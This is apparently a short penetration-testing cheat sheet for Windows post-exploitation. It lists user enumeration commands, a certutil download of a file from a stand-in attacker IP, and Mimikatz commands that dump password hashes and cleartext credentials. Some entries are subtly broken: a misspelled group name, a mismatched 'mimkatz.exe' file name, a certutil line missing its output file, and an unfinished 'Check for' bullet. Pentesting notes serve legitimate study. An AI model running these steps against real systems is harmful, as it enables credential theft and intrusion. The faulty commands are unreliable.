# Windows Shell

## Enumeration

- list users

      net users

- list adminstrator group members

      net localgroup administrator

## Management

- file upload

    - Start http server on attacker machine

          python3 -m http.server 4444

    - Upload file

          certutil -urlcache -f http://<attacker_ip>/<filename>

## Privesc

- Check for 
- Bypass User Access Control (UAC)  

## Loot

- Dump hashes (Mimikatz)

    -  x86: upload /usr/share/windows-resources/binaries/mimikatz/Win32/mimkatz.exe
    -  x64: upload /usr/share/windows-resources/binaries/mimikatz/x64/mimkatz.exe
    -  Run:

           .\mimikatz.exe

    - Check for necessary privileges

          privilege::debug

    - dump hashes + cleartext passwords

          sekurlsa::logonpasswords
          lsadump::sam
          



